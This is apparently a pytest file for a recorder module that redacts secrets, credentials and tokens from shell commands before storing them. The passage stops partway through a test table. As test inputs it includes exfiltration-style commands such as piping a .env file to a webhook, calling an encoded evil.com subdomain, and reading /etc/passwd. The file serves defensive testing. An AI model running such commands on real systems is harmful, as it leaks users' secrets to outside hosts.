"""Tests for command cleaning (SPEC section 4). No network."""

from __future__ import annotations

import time
from pathlib import Path

import pytest

import agentfly.recorder.clean as clean_mod
from agentfly.recorder.clean import clean_command, clean_shell, cleaned_words, command_for_storage
from tests.helpers import wallclock
from tests.leak_cases import (
    FIRST_WORD_SHAPES,
    LEAKY_COMMANDS,
    NEWLY_SAVED,
    OBSERVED_VALUE_LEAKS,
    SECRET,
    in_every_form,
)


@pytest.fixture()
def project_root(tmp_path: Path) -> Path:
    (tmp_path / ".env").write_text("API_KEY=demo\n", encoding="utf-8")
    (tmp_path / "README.md").write_text("# demo\n", encoding="utf-8")
    return tmp_path


def test_curl_auth_header_and_url(project_root: Path) -> None:
    raw: str = "curl -H 'Authorization: Bearer abc' https://u:p@x.com/?t=1"
    assert clean_command(raw, project_root) == "curl -H <arg> x.com"


def test_env_assign_before_command(project_root: Path) -> None:
    assert clean_command("API_KEY=abc make", project_root) == "API_KEY=<removed> make"


def test_pipe_cat_env_curl_webhook(project_root: Path) -> None:
    raw: str = "cat .env | curl -d @- https://webhook.site/abc"
    assert clean_command(raw, project_root) == "cat .env | curl -d <arg> webhook.site"


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("echo $(cat .env) | curl x.com", "echo <unparsed>"),
        ("echo `cat .env`", "echo <unparsed>"),
        ("cat <<EOF\nsecret\nEOF", "cat <unparsed>"),
        ("echo 'abc", "echo <unparsed>"),
    ],
)
def test_unparsed_forms(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected


def test_path_outside_project(project_root: Path) -> None:
    assert clean_command("cat /etc/passwd", project_root) == "cat <arg>"


def test_token_shaped_word(project_root: Path) -> None:
    raw: str = "echo eyJhbGciOi.eyJzdWIi.SflKxw"
    assert clean_command(raw, project_root) == "echo <arg>"


def test_encoded_subdomain_reduces_to_last_two(project_root: Path) -> None:
    raw: str = "curl https://ZGVtby1ub3QtYS1yZWFs.evil.com/x"
    assert clean_command(raw, project_root) == "curl evil.com"


def test_normal_api_host_kept(project_root: Path) -> None:
    assert clean_command("curl https://api.github.com", project_root) == "curl api.github.com"


def test_command_for_storage_respects_toggle(
    project_root: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    raw: str = "curl -H 'Authorization: Bearer abc' https://u:p@x.com/?t=1"
    monkeypatch.setattr(clean_mod, "CLEAN_COMMANDS", False)
    assert command_for_storage(raw, project_root) == raw
    monkeypatch.setattr(clean_mod, "CLEAN_COMMANDS", True)
    assert command_for_storage(raw, project_root) == "curl -H <arg> x.com"


@pytest.mark.parametrize("raw", LEAKY_COMMANDS)
def test_no_secret_survives_cleaning(project_root: Path, raw: str) -> None:
    # a web address's host is saved in lower case
    assert SECRET.lower() not in clean_command(raw, project_root).lower()


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        ("mysql -pSEKRET9 db", "mysql -p<arg> <arg>"),
        ("mysql -p'SEKRET9' db", "mysql -p<arg> <arg>"),
        # C1: the cluster `-uuser:SEKRET9` ends in a letter that takes a value, so the next word is
        # read as its value (the last-letter rule falls toward `<arg>`)
        ("curl -uuser:SEKRET9 https://h.com", "curl -u<arg> <arg>"),
        ("curl -H'Authorization: Bearer SEKRET9' https://h.com", "curl -H<arg> <arg>"),
        (
            "tool --password=SEKRET9 --token=SEKRET9 --api-key=SEKRET9",
            ("tool --password=<arg> --token=<arg> --api-key=<arg>"),
        ),
        ("curl https://user:SEKRET9@host.com/p", "curl host.com"),
        ("TOKEN=SEKRET9 make", "TOKEN=<removed> make"),
        ("export K=SEKRET9", "export <arg>"),
        # C2: a quoted assignment may hide a word break, so a command saved unread is `cmd`
        ("TOKEN='my SEKRET9' curl $(x)", "cmd <unparsed>"),
        ("curl https://u:SEKRET9@[host/", "curl <arg>"),
        ("K+=SEKRET9 make", "K=<removed> make"),
        ("a[0]=SEKRET9 make", "a=<removed> make"),
        ("curl -d @f.json https://x.com", "curl -d <arg> x.com"),
    ],
)
def test_secret_shapes_store_this_output(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected


def test_single_letter_options_and_end_of_options_are_kept(project_root: Path) -> None:
    assert clean_command("curl -s -d x --", project_root) == "curl -s -d <arg> --"


def test_flag_cluster_keeps_only_its_first_letter(project_root: Path) -> None:
    # -la and -pX look alike, so no cluster keeps more than one letter (SPEC section 4).
    assert clean_command("ls -la", project_root) == "ls -l<arg>"


def test_long_option_names_must_look_like_names(project_root: Path) -> None:
    long_name: str = "a" * 41
    assert clean_command(f"tool --{long_name}=x", project_root) == "tool <arg>"


@pytest.mark.parametrize(("raw", "expected"), [row[:2] for row in OBSERVED_VALUE_LEAKS])
def test_an_option_value_is_never_a_website(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        # saved exactly as on d62ea42
        ("curl -fsSL x.com", "curl -f<arg> x.com"),
        ("curl -s x.com", "curl -s x.com"),
        ("curl -L -o out x.com", "curl -L -o <arg> x.com"),
        ("curl -X POST x.com", "curl -X <arg> x.com"),
        ("curl --compressed x.com", "curl --compressed x.com"),
        ("wget -q x.com", "wget -q x.com"),
        ("ssh -i key user@h.com", "ssh -i <arg> h.com"),
        ("ssh -p 22 h.com", "ssh -p <arg> h.com"),
        ("scp f user@h.com:/p", "scp <arg> h.com"),
        ("rsync -av src h.com:dst", "rsync -a<arg> <arg> h.com"),
        ("nc -v h.com 80", "nc -v h.com <arg>"),
        ("curl -s -- x.com", "curl -s -- x.com"),
        # a cluster is judged by its last letter; `--` ends the options
        ("curl -sd token.abc x.com", "curl -s<arg> <arg> x.com"),
        # a value glued onto its option is a cluster too (owner 2026-10-23)
        ("curl -XPOST https://api.example.com", "curl -X<arg> <arg>"),
        ("ssh -p2222 h.com", "ssh -p<arg> <arg>"),
        # an option where a value was expected is that value, and its own value comes next; the
        # word after a glued value may be ssh's destination, so what follows is its command
        ("curl -XPOST -d tok.abc x.com", "curl -X<arg> <arg> <arg> x.com"),
        ("ssh -p2222 h.com tok.abc", "ssh -p<arg> <arg> <arg>"),
        # after a glued value `-i` may be `-p`'s value, so `key` may be the destination
        ("ssh -p22 -i key h.com tok.abc", "ssh -p<arg> <arg> <arg> <arg> <arg>"),
        ("ssh -qi key h.com cat tok.abc", "ssh -q<arg> <arg> h.com <arg> <arg>"),
        ("ssh -i -p h.com tok.abc", "ssh -i <arg> <arg> <arg>"),
        ("curl -5 tok.abc x.com", "curl -5 <arg> x.com"),  # curl 8 has no -5
        ("curl -- -d x.com", "curl -- -d x.com"),
        ("curl -d -- x.com", "curl -d <arg> x.com"),
        ("ssh -T git@github.com", "ssh -T github.com"),
        # the trade (owner 2026-10-23): an option no table lists takes a value
        ("curl --some-new-option x.com", "curl --some-new-option <arg>"),
        ("curl --data=a.b x.com", "curl --data=<arg> x.com"),
        # other programs keep their old cleaning
        ("git -C a.b push", "git -C <arg> <arg>"),
    ],
)
def test_web_tool_option_values(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected


def test_a_value_that_names_a_project_file_keeps_its_path(project_root: Path) -> None:
    assert clean_command("curl -T .env x.com", project_root) == "curl -T .env x.com"


def test_values_cost_one_lookup_each_and_ssh_remote_words_none(project_root: Path) -> None:
    disk = clean_mod.Lookups(project_root)
    words: str = " ".join(f"-d v{i}" for i in range(150))
    clean_command(f"curl {words}", project_root, disk)
    assert disk.left == clean_mod.LOOKUP_STEPS - 150
    disk = clean_mod.Lookups(project_root)
    remote: str = " ".join(f"w{i}" for i in range(300))
    assert clean_command(f"ssh h.com {remote}", project_root, disk) == "ssh h.com" + " <arg>" * 300
    assert disk.left == clean_mod.LOOKUP_STEPS


def test_no_value_tables_hold_option_names() -> None:
    for tool, (short, long) in clean_mod._NO_VALUE.items():
        assert short and all(c.isprintable() and c not in " -=" for c in short), tool
        assert len(set(short)) == len(short), tool
        # curl's `--http1.1` and `--tlsv1.2` hold a dot, which a saved option name may not
        assert all(clean_mod._LONG_OPTION_NAME.fullmatch(n.replace(".", "_")) for n in long), tool


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        # C1-fix1: `&`, `|&` and a new line end a part too (a new line is saved as `;`)
        ("curl x.com & ssh h.com tok.abc", "curl x.com & ssh h.com <arg>"),
        ("curl x.com |& ssh h.com tok.abc", "curl x.com |& ssh h.com <arg>"),
        ("curl x.com\nssh h.com tok.abc", "curl x.com ; ssh h.com <arg>"),
        ("a &\nb", "a & b"),
        ("curl x.com\n\nssh h.com", "curl x.com ; ssh h.com"),
        # `&` after `<` or `>`, or before `>`, is part of a redirection
        ("curl -s x.com 2>&1 | head", "curl -s x.com <arg> | head"),
        ("curl -s x.com &>log", "curl -s x.com <arg>"),
        # a backslash joins the lines, or keeps a separator in its word
        ("curl -d \\\n tok.abc x.com", "curl -d <arg> x.com"),
        (r"curl -d a\;tok.abc x.com", "curl -d <arg> x.com"),
        (r"find . -exec rm {} \;", "find . -e<arg> <arg> <arg> <arg>"),
        # a comment runs to its line's end, and a backslash in it joins nothing
        ("curl x.com # \\\nssh h.com tok.abc", "curl x.com ; ssh h.com <arg>"),
        ("# note\ncurl x.com", "curl x.com"),
        ("echo a#b", "echo <arg>"),
    ],
)
def test_separators_split_the_parts(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected


@pytest.mark.parametrize(
    ("raw", "loose"),
    [
        # C1-fix1: a word that may stand for no word or several
        ("$E", True),
        ("${E}", True),
        ("a$E", True),
        ("$'x'", True),
        ('"$@"', True),
        ('"${A[@]}"', True),
        ("-d>s", True),
        ("*.abc", True),
        ("?d", True),
        ("[ab]", True),
        ("{,}", True),
        ("{a..b}", True),
        ('a{b,"c"}', True),
        # one word, whatever the variable holds
        ('"$X"', False),
        ('"Bearer $T"', False),
        ('"${SRC}/"', False),
        ("'$X'", False),
        ("\\$X", False),
        ("{}", False),
        ("-I{}", False),
        (">out", False),
        ("2>&1", False),
        ("2>out", False),
        ("x.com", False),
    ],
)
def test_a_word_out_of_step(raw: str, loose: bool) -> None:
    assert clean_mod._out_of_step(raw) is loose


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        # C1-fix1: the `)` that closes a part is cut off before its words are read
        ("curl x.com)", "curl x.com"),
        ("curl x.com ) )", "curl x.com"),
        ("curl x.com\\)", "curl <arg>"),
    ],
)
def test_a_closing_parenthesis_is_cut(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        # C1-fix1: the program behind wrappers, `(`, assignments and redirections is read
        ("sudo curl -s x.com", "sudo curl -s x.com"),
        ("sudo -u bob curl -s x.com", "sudo -u <arg> curl -s x.com"),
        ("sudo -ubob curl -s x.com", "sudo -u<arg> curl -s x.com"),
        ("sudo -- curl -s x.com", "sudo -- curl -s x.com"),
        ("/usr/bin/sudo curl -s x.com", "/usr/bin/sudo curl -s x.com"),
        ("env A=1 curl -L x.com", "env A=<removed> curl -L x.com"),
        ("env -u A curl -s x.com", "env -u <arg> curl -s x.com"),
        ("timeout 5 wget -q x.com", "timeout <arg> wget -q x.com"),
        ("timeout -s KILL 5 curl -s x.com", "timeout -s <arg> <arg> curl -s x.com"),
        ("nice -n 5 curl -s x.com", "nice -n <arg> curl -s x.com"),
        ("exec curl -s x.com", "exec curl -s x.com"),
        ("stdbuf -oL curl -s x.com", "stdbuf -o<arg> curl -s x.com"),
        ("xargs -I{} curl -d {} x.com", "xargs -I<arg> curl -d <arg> x.com"),
        ("sudo curl -d https://tok.abc x.com", "sudo curl -d <arg> x.com"),
        ("(curl -s x.com)", "curl -s x.com"),
        ("( ( curl -s x.com ) )", "curl -s x.com"),
        ("A=1 (curl -d tok.abc x.com)", "A=<removed> curl -d <arg> x.com"),
        ("2>/dev/null curl -d tok.abc x.com", "<arg> curl -d <arg> x.com"),
        ("> out curl -d tok.abc x.com", "<arg> <arg> curl -d <arg> x.com"),
        ("curl x.com &<in ssh h.com tok.abc", "curl x.com & <arg> ssh h.com <arg>"),
        ("arr=(a tok.abc)", "arr=<removed>"),
        ("arr=(a b) curl -d tok.abc x.com", "arr=<removed> curl -d <arg> x.com"),
        ("arr=(a\\) tok.abc)", "arr=<removed>"),
        # an option no table lists, or a word that may be the program or not: the rest is <arg>
        ("sudo -E curl -s x.com", "sudo -E <arg> <arg> <arg>"),
        ("sudo $O curl -s x.com", "sudo <arg> <arg> <arg> <arg>"),
        ("timeout $T curl -d tok.abc x.com", "timeout <arg> <arg> <arg> <arg> <arg>"),
        ("sudo -u $U curl -s x.com", "sudo -u <arg> <arg> <arg> <arg>"),
    ],
)
def test_the_program_behind_wrappers_is_read(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected


def test_wrappers_and_parentheses_are_stepped_over_up_to_their_bounds(project_root: Path) -> None:
    assert (clean_mod.MAX_WRAPPERS, clean_mod.MAX_OPEN_PARENS) == (8, 16)
    tail: str = "curl -d tok.abc x.com"
    assert clean_command("nohup " * 8 + tail, project_root) == "nohup " * 8 + "curl -d <arg> x.com"
    assert clean_command("nohup " * 9 + tail, project_root) == "nohup " * 8 + " ".join(
        ["<arg>"] * 5
    )
    # C2-fix1: glued `((` is `<unparsed>`, so the bound is counted on spaced `( `
    assert clean_command("( " * 16 + tail, project_root) == "curl -d <arg> x.com"
    assert clean_command("( " * 17 + tail, project_root) == "<arg> <arg> <arg> <arg> <arg>"


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        # C1-fix1: a redirection uses up no option value; its target is saved as before
        ("curl -d >out tok.abc x.com", "curl -d <arg> <arg> x.com"),
        ("curl -d > out tok.abc x.com", "curl -d <arg> <arg> <arg> x.com"),
        ("curl -d >| out tok.abc x.com", "curl -d <arg> <arg> <arg> x.com"),
        ("curl -d 2>&1 tok.abc x.com", "curl -d <arg> <arg> x.com"),
        ("curl -d {fd}>out tok.abc x.com", "curl -d <arg> <arg> x.com"),
        ("wget -O <in tok.abc x.com", "wget -O <arg> <arg> x.com"),
        ("curl -d>out tok.abc x.com", "curl -d<arg> <arg> x.com"),
        # a word that may be no word or several: the word after it is a value
        ("curl -d $EMPTY tok.abc x.com", "curl -d <arg> <arg> x.com"),
        ("curl -d$s tok.abc x.com", "curl -d<arg> <arg> x.com"),
        ('curl -d "$@" tok.abc x.com', "curl -d <arg> <arg> x.com"),
        # and after ssh's options it may hold the destination: the rest is its command
        ("ssh -i $K h.com tok.abc", "ssh -i <arg> <arg> <arg>"),
        ("ssh $O h.com tok.abc", "ssh <arg> <arg> <arg>"),
        # kept: one word, whatever the variable holds
        (
            'curl -H "Authorization: Bearer $TOKEN" https://api.example.com',
            "curl -H <arg> api.example.com",
        ),
        ('scp "$FILE" deploy@prod.example.com:/srv/', "scp <arg> prod.example.com"),
        # a shell's script and what eval runs are never read
        ('sudo bash -c "curl -d https://tok.abc x.com"', "sudo bash -c <arg>"),
        ("bash -lc x https://tok.abc", "bash -l<arg> <arg> <arg>"),
        ("eval curl https://tok.abc", "eval <arg> <arg>"),
        ("bash run.sh https://a.b.com", "bash <arg> a.b.com"),
        # any other program: a `://` word after an option or a loose word is that one's value
        ("tool --url https://a.b.com", "tool --url <arg>"),
        ("tool -o 2>&1 https://a.b.com", "tool -o <arg> <arg>"),
        ("tool $X https://a.b.com", "tool <arg> <arg>"),
        ("tool https://a.b.com", "tool a.b.com"),
        ("tool -- https://a.b.com", "tool -- a.b.com"),
        ("caffeinate curl -d https://tok.abc x.com", "caffeinate <arg> -d <arg> <arg>"),
        ("$X curl -d https://tok.abc x.com", "<arg> <arg> -d <arg> <arg>"),
    ],
)
def test_words_after_the_program(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        *((raw, saved) for raw, saved, _ in NEWLY_SAVED),
        # kept as on c7ab4d7 (the same name and hosts); `&` now ends a part and `\` with a new
        # line joins two, so these two are saved without the `<arg>` those were saved as
        ("curl -s x.com > out", "curl -s x.com <arg> <arg>"),
        ("curl -s x.com 2>&1 | head", "curl -s x.com <arg> | head"),
        ("cd a && curl -s x.com &", "cd <arg> && curl -s x.com &"),
        (
            'curl -s \\\n -H "Accept: x" \\\n https://api.example.com',
            "curl -s -H <arg> api.example.com",
        ),
        (
            'curl -H "Authorization: Bearer $TOKEN" https://api.example.com',
            "curl -H <arg> api.example.com",
        ),
        ('scp "$FILE" deploy@prod.example.com:/srv/', "scp <arg> prod.example.com"),
        ('rsync -av "${SRC}/" prod.example.com:/srv/', "rsync -a<arg> <arg> prod.example.com"),
    ],
)
def test_the_briefs_commands_store_this_output(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected


def test_a_long_line_of_parentheses_wrappers_and_parts_reads_each_word_once(
    project_root: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    calls: list[str] = []
    classify = clean_mod._classify_word

    def counted(word: str, disk: clean_mod.Lookups, *, web_tool: bool, raw: str) -> str:
        calls.append(word)
        return classify(word, disk, web_tool=web_tool, raw=raw)

    monkeypatch.setattr(clean_mod, "_classify_word", counted)
    part: str = "( ( sudo -u bob env A=1 timeout 5 nice -n 5 curl -d tok.abc x.com ) ) &"
    lines: list[str] = [
        " ".join([part] * 16),  # 304 words in 16 parts
        "( " * 16 + "nohup " * 8 + "curl" + " -d tok.abc" * 145 + " x.com",  # 316 in one
    ]
    for line in lines:
        words: int = len(line.split())
        assert words >= 300
        calls.clear()
        disk = clean_mod.Lookups(project_root)
        saved: str = clean_command(line, project_root, disk)
        assert "tok.abc" not in saved and "x.com" in saved
        assert len(calls) <= words
        assert disk.left >= clean_mod.LOOKUP_STEPS - words


@wallclock
@pytest.mark.parametrize("filler", [",", "."])
def test_an_unclosed_brace_list_is_read_in_one_pass(project_root: Path, filler: str) -> None:
    # C1-fix1: a brace word of 64,000 characters with no closing `}`; read with backtracking it
    # took about 14 s, read in one pass it takes a few ms
    started: float = time.perf_counter()
    assert clean_command("echo {" + filler * 64_000, project_root) == "echo <arg>"
    assert time.perf_counter() - started < 0.25


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        # final verification: a character a backslash keeps is no operator and no word break
        ("echo \\>& ssh h.com tok.abc", "echo <arg> & ssh h.com <arg>"),
        ("echo \\>| ssh h.com tok.abc", "echo <arg> | ssh h.com <arg>"),
        ("ssh h.com a\\ #b \\\nx tok.abc", "ssh h.com <arg> <arg> <arg>"),
        # a continuation does not end a word, so `#` after it is in the word
        ("ssh h.com a\\\n#b \\\nx tok.abc", "ssh h.com <arg> <arg> <arg>"),
        # a comment still ends at its line, its `\` joining nothing
        ("curl x.com #a \\\nssh h.com tok.abc", "curl x.com ; ssh h.com <arg>"),
        # a redirection in a wrapper's options is passed over; `env -` reads no further
        ("sudo >out -u bob curl -s x.com", "sudo <arg> -u <arg> curl -s x.com"),
        ("env 2> err -u X curl -s x.com", "env <arg> <arg> -u <arg> curl -s x.com"),
        ("env - curl -s x.com", "env <arg> <arg> <arg> <arg>"),
        # a word ending in `/` names a folder, not a wrapper
        ("sudo/ tok.abc", "sudo/ <arg>"),
    ],
)
def test_final_verification_shapes(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        # lenses: an unquoted `${` whose `}` is not in its word, and any `\r`, cannot be split
        ("curl -d ${X:-a b tok.abc c} x.com", "curl <unparsed>"),
        ("curl -d ${X:-a;tok.abc x} x.com", "curl <unparsed>"),
        ("curl -d a\rtok.abc x.com", "curl <unparsed>"),
        ("echo ${HOME}/a x.com", "echo <arg> <arg>"),
        ('curl -d "${X:-a b}" x.com', "curl -d <arg> x.com"),
        # C2: a process substitution makes the command `<unparsed>`, as `$(…)` does
        ("ssh -o <(x) h.com tok.abc", "ssh <unparsed>"),
        ("curl -d <(x) tok.abc x.com", "curl <unparsed>"),
        # each listed wrapper is stepped over; an option its table lacks ends the reading
        ("time curl -s x.com", "time curl -s x.com"),
        ("command curl -s x.com", "command curl -s x.com"),
        ("doas curl -s x.com", "doas curl -s x.com"),
        ("nohup curl -s x.com", "nohup curl -s x.com"),
        ("xargs curl -s x.com", "xargs curl -s x.com"),
        ("timeout -k 1 5 curl -s x.com", "timeout -k <arg> <arg> curl -s x.com"),
        ("sudo -s curl -s x.com", "sudo -s <arg> <arg> <arg>"),
        ("sudo -i curl -s x.com", "sudo -i <arg> <arg> <arg>"),
        ("env -S curl -s x.com", "env -S <arg> <arg> <arg>"),
        ("env -i curl -s x.com", "env -i <arg> <arg> <arg>"),
    ],
)
def test_lens_shapes(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        # C2-fix1: bash reads `((` as arithmetic or as two subshells by what follows, so a `((`
        # anywhere, after a line continuation is joined too, makes the command `<unparsed>`
        ("(( curl + tok.abc ))", "cmd <unparsed>"),
        ("((curl + tok.abc))", "cmd <unparsed>"),
        ("(\\\n( curl + tok.abc ))", "cmd <unparsed>"),
        ("cd a && (( curl + tok.abc ))", "cd <unparsed>"),
        ("echo '((' tok.abc", "echo <unparsed>"),
        # glued subshells written apart are read as before
        ("( (curl -d tok.abc x.com) )", "curl -d <arg> x.com"),
    ],
)
def test_a_double_parenthesis_is_unparsed(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected
    sites: tuple[str, ...] = ("x.com",) if "x.com" in expected else ()
    assert clean_mod.clean_shell(raw, project_root)[1] == sites


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        # C2-fix2: a command saved unread is named `cmd` when its first word is a redirection, a
        # group, a comment or holds a backslash (the lead's merge review of 27a7358)
        ("2>/a/tok.abc cat $(y)", "cmd <unparsed>"),
        ("cat</a/tok.abc $(y)", "cmd <unparsed>"),
        ("X=1 >/a/tok.abc cat $(y)", "cmd <unparsed>"),
        ("\\' /tok.abc' $(y) '", "cmd <unparsed>"),
        ("!(/a/tok.abc x) x.com", "cmd <unparsed>"),
        ("@(/a/tok.abc x) $(y)", "cmd <unparsed>"),
        ("#/a/tok.abc $(y)", "cmd <unparsed>"),
        ("2>/a/tok.abc cat " + "a " * (64 * 1024), "cmd <unparsed>"),  # past the cap
        # a plain word, a plain path and a plain assignment keep the name
        ("cat $(y)", "cat <unparsed>"),
        ("/usr/bin/cat $(y)", "cat <unparsed>"),
        ("X=1 cat $(y)", "cat <unparsed>"),
        ("cat " + "a " * (64 * 1024), "cat <unparsed>"),
    ],
)
def test_an_unread_command_names_no_unsure_first_word(
    project_root: Path, raw: str, expected: str
) -> None:
    assert clean_shell(raw, project_root) == (expected, ())


_PAST_CAP: str = " x" * 70_000  # 140,000 characters: the command is over 128 KiB


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        # C2-fix3: past 128 KiB the program is named from the first 4,096 characters, so a
        # program word that runs to the end of them is cut before what would name it `cmd`
        ("x" * 4086 + "/a/tok.abc'q' z", "cmd <unparsed>"),
        ("'" + "x" * 4085 + "/a/tok.abc z' y", "cmd <unparsed>"),
        ("x" * 4086 + "/a/tok.abc$X z", "cmd <unparsed>"),
        ("x" * 4086 + "/a/tok.abc z", "cmd <unparsed>"),  # fills the window to its last character
        ("A=b " * 1021 + "xx/a/tok.abc$X z", "cmd <unparsed>"),
        ("A=b " * 1024 + "cat z", "cmd <unparsed>"),  # no program word inside the window
        # a program word followed by a blank or a separator inside the window keeps its name
        ("cat", "cat <unparsed>"),
        ("x" * 4085 + "/a/tok.abc z", "tok.abc <unparsed>"),  # its last character, a blank
        ("x" * 4085 + "/a/tok.abc;z", "tok.abc <unparsed>"),
        ("A=b " * 1020 + "xx/a/tok.abc z", "tok.abc <unparsed>"),
    ],
)
def test_a_program_word_cut_by_the_window_is_cmd(
    project_root: Path, raw: str, expected: str
) -> None:
    assert clean_shell(raw + _PAST_CAP, project_root) == (expected, ())


def test_an_unsure_first_word_past_the_cap_names_no_value(project_root: Path) -> None:
    # past 128 KiB only the start is read, so each form is read there too
    pad: str = " a" * (64 * 1024)
    for form in in_every_form(FIRST_WORD_SHAPES):
        raw: str = form.format(V=f"{SECRET}.abc") + pad
        command, sites = clean_shell(raw, project_root)
        assert SECRET not in command and sites == (), form


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        # C2-fix2: with `extglob` on, bash reads `@(…)`, `+(…)`, `!(…)`, `*(…)` and `?(…)` as one
        # word, so a `(` glued after one of them anywhere makes the command `<unparsed>`
        ("curl -d @(a tok.abc ) x.com", "curl <unparsed>"),
        ("curl -d +(a tok.abc ) x.com", "curl <unparsed>"),
        ("curl -d !(a tok.abc ) x.com", "curl <unparsed>"),
        ("curl -d *(a tok.abc ) x.com", "curl <unparsed>"),
        ("curl -d ?(a tok.abc ) x.com", "curl <unparsed>"),
        ("curl -d @\\\n(a tok.abc ) x.com", "curl <unparsed>"),
        ("curl -d x+(a tok.abc ) x.com", "curl <unparsed>"),
        ("echo '!(' tok.abc", "echo <unparsed>"),
        # spaced, they are read as before
        ("curl -d @ (a) x.com", "curl -d <arg> <arg> x.com"),
    ],
)
def test_an_extglob_group_is_unparsed(project_root: Path, raw: str, expected: str) -> None:
    assert clean_command(raw, project_root) == expected


def test_each_wrapper_value_option_takes_the_next_word(project_root: Path) -> None:
    # the brief's lists, written out: a letter dropped from a table fails here
    listed: dict[str, str] = {
        "sudo": "ughpCDrtU",
        "doas": "uC",
        "env": "uC",
        "timeout": "sk",
        "nice": "n",
        "stdbuf": "ioe",
        "xargs": "nLPsdEIa",
    }
    for wrapper, letters in listed.items():
        duration: str = " 5" if wrapper == "timeout" else ""
        saved_duration: str = " <arg>" if wrapper == "timeout" else ""
        for letter in letters:
            raw: str = f"{wrapper} -{letter} v{duration} curl -s x.com"
            expected: str = f"{wrapper} -{letter} <arg>{saved_duration} curl -s x.com"
            assert clean_command(raw, project_root) == expected, raw


@pytest.mark.parametrize("program", ["echo", "git push --force #"])
def test_a_command_over_the_recorders_parse_cap_is_saved_unparsed(
    project_root: Path, program: str
) -> None:
    # P1 (owner 2026-10-25, 2026-10-27): a command over 128 KiB is not parsed and is saved as
    # `<unparsed>`, whatever its shape; one just under is cleaned as before
    over = f"{program} " + "a" * (128 * 1024)
    assert clean_command(over, project_root) == f"{program.split()[0]} <unparsed>"
    under = "echo " + "a" * (128 * 1024 - 10)
    assert clean_command(under, project_root) == "echo <arg>"


@wallclock
def test_an_over_long_command_is_saved_unread_fast(project_root: Path) -> None:
    # the program is named from the command's start: the token walk is Python, a character at a
    # time (2 MiB took about 0.6 s of CPU)
    command = "ls " + "a " * (1 << 20)
    started = time.process_time()
    assert clean_command(command, project_root) == "ls <unparsed>"
    assert time.process_time() - started < 0.1


def test_a_command_past_the_parts_count_ends_in_unparsed(
    project_root: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # F18: past MAX_PARTS parts the rest is not read, so nothing after the cut is saved
    monkeypatch.setattr(clean_mod, "MAX_PARTS", 3)
    assert clean_command("ls; ls\nls", project_root) == "ls ; ls ; ls"  # at the count: all read
    late: str = "curl x.com README.md"
    assert clean_command(f"ls; ls\nls\n{late}", project_root) == "ls ; ls ; ls ; <unparsed>"
    assert clean_command(f"ls & ls | ls && {late}", project_root) == "ls & ls | ls && <unparsed>"


@pytest.mark.parametrize(
    ("raw", "pieces", "expected"),
    [
        ("curl x.com README.md", 5, "curl x.com README.md"),  # at the count: all read
        ("curl x.com README.md", 4, "curl x.com <unparsed>"),
        ("curl x.com README.md", 2, "curl <unparsed>"),
        ("curl x.com", 0, "<unparsed>"),
        # a word cut between its pieces is dropped whole, never saved in part
        ("curl README.md x.com'/p'", 5, "curl README.md <unparsed>"),
        ("curl README.md x.co\\\nm", 6, "curl README.md <unparsed>"),
        ('curl README.md "x".com', 5, "curl README.md <unparsed>"),
    ],
)
def test_a_command_past_the_pieces_count_ends_at_a_word_break(
    project_root: Path, monkeypatch: pytest.MonkeyPatch, raw: str, pieces: int, expected: str
) -> None:
    # F18: past MAX_PIECES pieces the part in progress ends at its last word break
    monkeypatch.setattr(clean_mod, "MAX_PIECES", pieces)
    assert clean_command(raw, project_root) == expected


def test_the_cleaner_counts_are_pinned(project_root: Path) -> None:
    assert (clean_mod.MAX_PARTS, clean_mod.MAX_PIECES) == (1_000, 20_000)
    saved: str = clean_command("ls\n" * 1_000 + "curl x.com README.md", project_root)
    assert saved == "ls ; " * 1_000 + "<unparsed>"
    saved = clean_command("cat " + "a " * 9_999 + "README.md x.com", project_root)
    assert saved == "cat" + " <arg>" * 9_999 + " <unparsed>"  # 20,000 pieces, then the cut


@pytest.mark.parametrize(
    ("raw", "expected"),
    [
        # C2: a `$'…'` string ends at the first `'` no backslash keeps, so `\'` is inside it and so
        # is any separator; it is one word, and the word after it is a value
        ("curl -d $'\\' a tok.abc ' x.com \\'", "curl -d <arg> <arg> <arg>"),
        ("cat $'\\';tok.abc' .env", "cat <arg> .env"),
        ("cat $'\\'#tok.abc' .env", "cat <arg> .env"),
        ("cat $'\\'\ntok.abc' .env", "cat <arg> .env"),
        ("cat $'\\'&tok.abc' .env", "cat <arg> .env"),
        ("curl $'\\x2dd' tok.abc x.com", "curl <arg> <arg> x.com"),  # bash reads `-d`
        # a backslash before the `$`, and `$$` (the process id), leave a plain quote after them
        ("curl -d \\$'\\' x.com", "curl -d <arg> x.com"),
        ("curl -d $$'\\' x.com", "curl -d <arg> <arg>"),  # `$$` may be any word, as on c847ff4
        # the split pairs `$$` too, so the `;` after `$$'\\'` ends the part
